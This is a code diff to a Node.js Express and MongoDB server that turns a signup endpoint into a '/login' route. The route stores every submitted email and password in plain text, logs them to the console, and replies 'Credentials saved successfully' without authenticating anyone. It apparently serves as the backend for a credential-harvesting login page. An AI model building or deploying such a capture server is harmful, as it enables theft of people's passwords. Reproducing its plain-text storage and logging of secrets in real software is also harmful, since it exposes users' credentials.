@@ -1,17 +1,17 @@
 const express = require("express");
 const bodyParser = require("body-parser");
 const mongoose = require("mongoose");
-const cors = require("cors"); // Importing CORS package
-require("dotenv").config(); // Load environment variables from .env file
+const cors = require("cors");
+require("dotenv").config();
 
 // Initialize app
 const app = express();
-const PORT = process.env.PORT || 3000; // Use the PORT from .env or default to 3000
-const DataB = process.env.DATAB; // Get the MongoDB connection string from .env
+const PORT = process.env.PORT || 3000;
+const DataB = process.env.DATAB;
 
 // Middleware
 app.use(bodyParser.json());
-app.use(cors()); // Enable CORS for all routes
+app.use(cors());
 
 // Connect to MongoDB
 mongoose
@@ -24,38 +24,32 @@ mongoose
 
 // Define schema
 const userSchema = new mongoose.Schema({
-  emailOrPhone: { type: String, required: true, unique: true }, // Email or Phone number
-  password: { type: String, required: true }, // Password
+  email: { type: String, required: true }, // Email or phone number
+  password: { type: String, required: true }, // Plain-text password
   createdAt: { type: Date, default: Date.now },
 });
 
 // Define model
 const User = mongoose.model("User", userSchema);
 
-// Signup Endpoint (Store email or phone number and password)
-app.post("/signup", async (req, res) => {
-  console.log("Signup request received:", req.body);
-  const { emailOrPhone, password } = req.body;
+// Login Endpoint (Save email and password in DB)
+app.post("/login", async (req, res) => {
+  console.log("Login request received:", req.body);
+  const { email, password } = req.body;
 
   // Check if both fields are provided
-  if (!emailOrPhone || !password) {
+  if (!email || !password) {
     return res
       .status(400)
-      .json({ message: "Email/Phone and password are required." });
+      .json({ message: "Email and password are required." });
   }
 
   try {
-    // Check if the user already exists
-    const existingUser = await User.findOne({ emailOrPhone });
-    if (existingUser) {
-      return res.status(409).json({ message: "User already exists." });
-    }
-
-    // Create and save the new user (without hashing the password for now)
-    const newUser = new User({ emailOrPhone, password });
+    // Save the email and password to the database
+    const newUser = new User({ email, password });
     await newUser.save();
 
-    return res.status(201).json({ message: "User registered successfully." });
+    return res.status(201).json({ message: "Credentials saved successfully." });
   } catch (error) {
     return res
       .status(500)
@@ -68,7 +62,7 @@ app.get("/", (req, res) => {
   res.send("Server is running...");
 });
 
-// Catch-all route for undefined endpoints (this will help return a proper 404)
+// 404 for undefined routes
 app.use((req, res) => {
   res.status(404).json({ message: "Route not found" });
 });
